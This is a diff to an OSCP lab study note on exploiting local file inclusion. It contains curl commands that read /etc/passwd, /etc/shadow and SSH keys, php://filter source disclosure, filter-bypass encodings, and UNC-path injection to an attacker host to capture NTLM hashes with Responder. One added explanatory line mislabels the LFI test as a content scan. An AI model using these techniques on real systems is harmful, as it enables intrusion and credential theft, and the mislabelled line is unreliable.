@@ -8,6 +8,7 @@
 
 Find the parameter — look for `?file=`, `?page=`, `?path=`, `?template=`, `?img=` in the URL or form source. Then test:
 
+> **Why:** This content scan tests likely paths or hostnames to find hidden pages, files, or virtual hosts that are not linked from the homepage.
 ```bash
 # Basic path traversal — confirms LFI if /etc/passwd returns
 curl -s "http://$BoxIP/index.php?file=../../../../etc/passwd"
@@ -41,12 +42,12 @@ $db_password = "REDACTED";
 
 ## What did you get?
 
-- [ ] `/etc/passwd` is returned → **LFI confirmed — try `/etc/shadow`, SSH keys at `/home/username/.ssh/id_rsa`, and web config files**
-- [ ] PHP source is returned via `php://filter` → **Read all included config files for database credentials**
-- [ ] Credentials or keys are found → **Validate them and go to Step 17 · [[Linux - Credential Search]] or SSH in**
-- [ ] LFI works but no useful files are found → **Go to HackTricks LFI for log poisoning and `data://` RCE payloads**
+- [ ] `/etc/passwd` is returned → **Run the same request with `/etc/shadow`, `/home/$Username/.ssh/id_rsa`, and the application's configuration filename, saving each response to `$BoxDir/loot/`**
+- [ ] PHP source is returned via `php://filter` → **Run `curl -s 'http://$BoxIP/$Path?file=php://filter/convert.base64-encode/resource=$Config' | base64 -d` for each included config file and save the decoded source**
+- [ ] Credentials or keys are found → **Save them to `$BoxDir/loot/credentials.txt`, then go to Step 17 · [[Linux - Credential Search]] or Step 3B · [[Linux - SSH Brute Force]] for a controlled SSH test**
+- [ ] LFI works but no useful files are found → **Go to Step 7A · [[Linux - RFI]] and run its PHP-wrapper tests, then return here for the log-poisoning branch if the wrapper is blocked**
 - [ ] A shell is caught from `data://` or log poisoning → **Go to Step 12 · [[Linux - Shell Stabilise]]**
-- [ ] The parameter does not accept traversal → **Try null byte (`%00`) if PHP < 5.3.4, and double URL-encoding**
+- [ ] The parameter does not accept traversal → **Resend the request with a `%00` suffix only when the PHP version is below 5.3.4, then retry the path with `%252e%252e%252f` double URL-encoding**
 - [ ] The host is Windows and UNC paths are accepted → **Set up Responder (`responder -I tun0`) and inject `\\$LocalIP\share` as the file path. Crack a captured NTLMv2 response offline with hashcat mode 5600**
 - [ ] UNC path is blocked ("Suspicious Activity Blocked" or similar WAF response) → **Try forward slashes instead of backslashes: `http://$BoxIP/index.php?view=//$LocalIP/share/probe` -- many WAFs only filter backslash-UNC patterns, not forward-slash equivalents**
 
@@ -70,9 +71,40 @@ For RCE via `data://` or log poisoning, build the payload from HackTricks — th
 > [!warning] 💡
 > Some WAFs block backslash-style UNC paths (`\\IP\share`) but not forward-slash equivalents (`//IP/share`). If the app returns "Suspicious Activity Blocked" on a backslash UNC, switch to forward slashes before trying other bypasses.
 
+## Forward-slash UNC bypass
+
+When a Windows application’s file parameter rejects `\\server\share`, try equivalent slash forms. A UNC path points to a Windows network share; some filters block backslashes literally instead of understanding the underlying path.
+
+> **Why:** These requests compare backslash and forward-slash UNC forms against the same file parameter; look for an outbound authentication attempt in Responder or a changed response.
+```bash
+# Start Responder on tun0 in a separate terminal before sending these probes.
+curl -s "http://$BoxIP/index.php?view=\\\\$LocalIP\\share\\probe"
+curl -s "http://$BoxIP/index.php?view=//$LocalIP/share/probe"
+curl -s "http://$BoxIP/index.php?view=\\/$LocalIP/share/probe"
+```
+
+## Additional routing
+
+- [ ] A UNC request triggers an inbound NTLM challenge → **Capture only the authorized hash material, crack it offline, and validate the account**
+- [ ] Backslashes are blocked but forward slashes change the response → **Continue with the forward-slash form and document the filter bypass**
+- [ ] All forms are blocked → **Return to ordinary LFI paths or Step 10 · [[Windows - Exploit Search]]**
+
 ## External Resources
 
 | Resource | Link |
 |---|---|
 | HackTricks — LFI | https://book.hacktricks.xyz/pentesting-web/file-inclusion |
 | PayloadsAllTheThings — LFI | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion |
+## Seen in
+- [[OSCP/BOXES/WRITE UPS/Linux/3. Payday|Payday]] -- confirmed in the box write-up
+- [[OSCP/BOXES/WRITE UPS/Linux/4. Snookums|Snookums]] -- confirmed in the box write-up
+- [[OSCP/BOXES/WRITE UPS/AD/Flight|Flight]] -- confirmed in the box write-up
+
+## Related stages
+
+- [[Linux - Service Scan]]
+- [[Linux - Web Enum]]
+- [[Linux - Exploit Search]]
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
